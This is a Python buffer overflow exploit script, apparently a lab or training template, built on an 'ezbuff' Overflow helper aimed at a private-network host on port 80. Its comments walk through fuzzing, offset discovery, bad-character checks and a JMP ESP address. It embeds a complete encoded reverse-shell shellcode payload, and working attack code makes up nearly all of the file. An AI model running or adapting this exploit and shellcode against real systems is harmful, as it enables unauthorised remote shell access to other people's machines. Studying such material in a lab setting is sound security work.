#!/usr/bin/env python3

from ezbuff.src.overflow import Overflow

def main():
	# Instanstantiate `Overflow` object
	obj = Overflow("192.168.230.10", 80, max_fuzz_bytes=2000)

	# to obtain details on the object you instantiated
	# print(obj)
	# for more details
	# print(repr(obj))

	# Change the target IP if running in interactive Python interpreter
	# obj.targ_ip = "127.0.0.1"

	# Change the target port number if running in interactive Python interpreter
	# obj.targ_port = 443

	# The number of seconds to wait in between the fuzzing process,
	# default = 5
	# obj.fuzz_interval_seconds = 1

	# Set the increment of the fuzzer to be 150 as opposed to
	# the default of 100
	# obj.fuzz_increment = 150

	# Fuzz the vulnerable application
	# obj.fuzz()

	# Sets the number of bytes to crash the application.
	# Make sure to accommodate space for reverse shell!!
	# [!] this should be set after running `fuzz` for the remainder of the process
	# obj.num_bytes_crash = 1500

	# Sending pattern to determine offset
	# obj.send_pattern()

	# Get offset 
	# offset = obj.get_offset("30416B30")
	# print(offset) # 780

	# Set offset value after retrieving from function above
	# [!] this should be set after running `get_offset` for the remainder of the process
	obj.offset = 780

	# Testing offset (obj.offset must be set from)
	# obj.test("offset")

	# Add bad characters to list containing bad characters found
	# after sending string of characters
	# [!] after sending a string of characters and finding a bad character
	# 	  append the character as an argument to the function `add_bad_char`
	#	  as shown below
	# obj.add_bad_char("\x0a", "\x0d", "\x25", "\x26", "\x2b", "\x3d")

	# Send payload with all characters to find bad characters
	# obj.send_bad_chars()

	# Set the memory address to jump to after finding valid memory address
	# containing `jump esp` instructions in x86 architecture
	# [!] the `jump_esp` must be bytes as shown below
	obj.jump_esp = b"\x83\x0c\x09\x10"

	# test the memory address that was found using mona script
	# [!] `obj.jump_esp` must be set before testing memory address
	# obj.test("esp")

	# reverse shell payload
	# [!] must be in bytes
	shellcode = (
b"\xbe\x88\xe8\x2f\x51\xdb\xc0\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
b"\x52\x83\xc2\x04\x31\x72\x0e\x03\xfa\xe6\xcd\xa4\x06\x1e\x93"
b"\x47\xf6\xdf\xf4\xce\x13\xee\x34\xb4\x50\x41\x85\xbe\x34\x6e"
b"\x6e\x92\xac\xe5\x02\x3b\xc3\x4e\xa8\x1d\xea\x4f\x81\x5e\x6d"
b"\xcc\xd8\xb2\x4d\xed\x12\xc7\x8c\x2a\x4e\x2a\xdc\xe3\x04\x99"
b"\xf0\x80\x51\x22\x7b\xda\x74\x22\x98\xab\x77\x03\x0f\xa7\x21"
b"\x83\xae\x64\x5a\x8a\xa8\x69\x67\x44\x43\x59\x13\x57\x85\x93"
b"\xdc\xf4\xe8\x1b\x2f\x04\x2d\x9b\xd0\x73\x47\xdf\x6d\x84\x9c"
b"\x9d\xa9\x01\x06\x05\x39\xb1\xe2\xb7\xee\x24\x61\xbb\x5b\x22"
b"\x2d\xd8\x5a\xe7\x46\xe4\xd7\x06\x88\x6c\xa3\x2c\x0c\x34\x77"
b"\x4c\x15\x90\xd6\x71\x45\x7b\x86\xd7\x0e\x96\xd3\x65\x4d\xff"
b"\x10\x44\x6d\xff\x3e\xdf\x1e\xcd\xe1\x4b\x88\x7d\x69\x52\x4f"
b"\x81\x40\x22\xdf\x7c\x6b\x53\xf6\xba\x3f\x03\x60\x6a\x40\xc8"
b"\x70\x93\x95\x5f\x20\x3b\x46\x20\x90\xfb\x36\xc8\xfa\xf3\x69"
b"\xe8\x05\xde\x01\x83\xfc\x89\xed\xfc\x89\xaf\x86\xfe\x75\x20"
b"\x7e\x76\x93\x2a\x90\xde\x0c\xc3\x09\x7b\xc6\x72\xd5\x51\xa3"
b"\xb5\x5d\x56\x54\x7b\x96\x13\x46\xec\x56\x6e\x34\xbb\x69\x44"
b"\x50\x27\xfb\x03\xa0\x2e\xe0\x9b\xf7\x67\xd6\xd5\x9d\x95\x41"
b"\x4c\x83\x67\x17\xb7\x07\xbc\xe4\x36\x86\x31\x50\x1d\x98\x8f"
b"\x59\x19\xcc\x5f\x0c\xf7\xba\x19\xe6\xb9\x14\xf0\x55\x10\xf0"
b"\x85\x95\xa3\x86\x89\xf3\x55\x66\x3b\xaa\x23\x99\xf4\x3a\xa4"
b"\xe2\xe8\xda\x4b\x39\xa9\xeb\x01\x63\x98\x63\xcc\xf6\x98\xe9"
b"\xef\x2d\xde\x17\x6c\xc7\x9f\xe3\x6c\xa2\x9a\xa8\x2a\x5f\xd7"
b"\xa1\xde\x5f\x44\xc1\xca")

	# pass the shellcode into the function `send_payload`
	# [!] `jump_esp` and `offset` must be set to send reverse shell payload
	# obj.send_payload(shellcode)

if __name__ == '__main__':
	main()
